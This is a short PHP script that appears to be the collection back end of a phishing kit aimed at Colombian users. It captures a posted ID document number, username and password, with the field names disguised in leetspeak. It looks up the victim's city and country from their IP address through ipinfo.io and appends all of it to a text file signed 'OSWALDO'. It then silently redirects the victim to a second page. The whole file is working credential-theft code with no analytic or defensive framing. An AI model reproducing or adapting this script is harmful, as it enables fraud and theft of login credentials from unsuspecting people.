<?php
session_start();
date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$ct = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));


$file = fopen("privateNOTEpadDAta.txt", "a");
fwrite($file, "DNY: ".$_POST['d0cumento']."\r\nUS3R: ".$_POST['us3r']."\r\nCl4v3: ".$_POST['P44S']."\r\nFecha: ".date('d-m-Y')." | ".date('H:i:s')."\r\n".$cc." ".$ct." ".$userp." " . PHP_EOL);
fwrite($file, "***************OSWALDO****************** " . PHP_EOL);
fclose($file);


header("Location: index2.html");
exit
?>